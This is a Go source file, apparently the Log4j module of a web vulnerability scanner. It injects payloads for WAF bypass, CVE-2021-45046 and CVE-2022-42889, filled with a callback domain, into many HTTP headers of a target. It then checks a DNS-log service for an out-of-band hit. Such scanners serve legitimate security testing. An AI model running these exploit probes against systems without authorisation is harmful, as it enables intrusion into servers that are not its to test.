package log4j

import (
	"fmt"
	"github.com/thoas/go-funk"
	"github.com/yhy0/Jie/conf"
	JieOutput "github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/Jie/pkg/util"
	"strings"
	"time"
)

/**
   @author yhy
   @since 2023/5/15
   @desc //TODO
**/

func Scan(target, method, body string) {
	randstr := util.RandLetterNumbers(6)
	payloads := generate_waf_bypass_payloads(conf.GlobalConfig.Reverse.Domain, randstr)

	payloads = append(payloads, get_cve_2021_45046_payloads(conf.GlobalConfig.Reverse.Domain, randstr)...)
	payloads = append(payloads, get_cve_2022_42889_payloads(conf.GlobalConfig.Reverse.Domain, randstr)...)

	for _, payload := range payloads {
		var headers = make(map[string]string, len(commonHeaders))
		for _, header := range commonHeaders {
			headers[header] = payload
		}
		_, err := httpx.Request(target, method, body, false, headers)
		if err != nil {
			continue
		}
	}

	if pullLogs(randstr) {
		JieOutput.OutChannel <- JieOutput.VulMessage{
			DataType: "web_vul",
			Plugin:   "Log4j",
			VulnData: JieOutput.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     target,
				Ip:         "",
			},
			Level: JieOutput.Critical,
		}
	}
}

// pullLogs 获取 dnslog 日志记录  https://github.com/ac0d3r/Hyuga
func pullLogs(randstr string) bool {
	api := fmt.Sprintf("https://%s/api/v2/record/all?token=%s&filter=%s", conf.GlobalConfig.Reverse.Domain, conf.GlobalConfig.Reverse.Token, randstr)

	resp, err := httpx.Request(api, "GET", "", false, nil)
	if err != nil {
		return false
	}

	if funk.Contains(resp.Body, conf.GlobalConfig.Reverse.Domain) {
		return true
	}

	return false
}

func generate_waf_bypass_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range waf_bypass_payloads {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}

func get_cve_2021_45046_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range cve_2021_45046 {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}

func get_cve_2022_42889_payloads(callback_host, randstr string) []string {
	var payloads []string
	for _, i := range cve_2022_42889 {
		payload := strings.ReplaceAll(i, "{{callback_host}}", callback_host)
		payload = strings.ReplaceAll(payload, "{{random}}", randstr)
		payloads = append(payloads, payload)
	}
	return payloads
}
